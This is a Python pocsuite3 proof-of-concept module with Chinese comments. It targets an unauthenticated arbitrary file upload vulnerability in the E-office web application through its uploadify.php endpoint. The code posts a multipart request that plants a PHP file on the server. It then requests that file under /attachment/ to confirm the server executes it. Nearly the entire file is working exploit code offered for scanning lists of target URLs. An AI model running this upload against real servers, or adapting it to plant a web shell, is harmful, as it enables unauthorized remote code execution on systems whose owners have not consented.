from collections import OrderedDict
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
)
from pocsuite3.lib.core.interpreter_option import (
    OptString,
    OptDict,
    OptIP,
    OptPort,
    OptBool,
    OptInteger,
    OptFloat,
    OptItems,
)
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "mlxml"  # PoC作者的大名
    vulDate = "2023-08-01"  # 漏洞公开的时间,不知道就写今天
    createDate = "2023-08-22"  # 编写 PoC 的日期
    updateDate = "2023-08-22"  # PoC 更新的时间,默认和编写时间一样
    references = [""]  # 漏洞地址来源,0day不用写
    name = "E-office_uploadify"  # PoC 名称
    appPowerLink = "https://www.e-office.cn/"  # 漏洞厂商主页地址
    appName = "任意文件上传"  # 漏洞应用名称
    appVersion = "E-office"  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            app="E-offic"
        """  # 漏洞简要描述
    pocDesc = """
            pocsuite -r E-Office_uploadify.py -f url.txt
        """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        try:
            full_url = f"{self.url}/inc/jquery/uploadify/uploadify.php"
            headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",
                "Connection": "close", "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4",
                "Accept-Encoding": "gzip"}
            data = "--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"Stanleyman.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo md5('Stanleyman')?>\r\n\r\n--e64bdf16c554bbc109cecef6451c26a4--\r\n"

            response = requests.post(full_url, headers=headers, data=data, verify=False, timeout=5, allow_redirects=False)
            if response.status_code == 200 and response.text:
                verify_addr = f"{self.url}/attachment/{response.text}/Stanleyman.php"
                if 'addc95d32615a14aafa784cc06974f32' in requests.get(verify_addr).text:
                    result.append(full_url)
        except Exception as e:
             print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

def other_fuc():
    pass


def other_utils_func():
    pass


register_poc(DemoPOC)
